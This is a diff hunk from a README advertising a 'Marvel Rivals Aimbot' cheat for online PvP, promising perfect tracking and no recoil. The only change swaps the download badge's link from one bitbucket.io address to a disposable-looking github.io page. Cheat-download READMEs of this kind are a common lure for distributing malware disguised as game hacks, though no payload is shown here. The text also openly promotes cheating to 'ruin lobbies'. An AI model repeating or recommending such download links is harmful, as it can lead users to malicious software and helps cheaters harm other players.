@@ -4,7 +4,7 @@
 
 **Marvel Rivals** is pure chaos: third-person team brawls, explosive powers, high-speed aim duels. If you want to climb the ranks or just ruin lobbies, you need a cheat that takes your **aim from average to robotic**. The **Marvel Rivals Aimbot** is that cheat—offering **perfect tracking, no-recoil shots, and head-snapping precision** built for PvP dominance. 💥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Marvel-Rivals-Aimbot-libi.github.io/.github)
 ---
 
 ## 🎮 What Is Marvel Rivals?
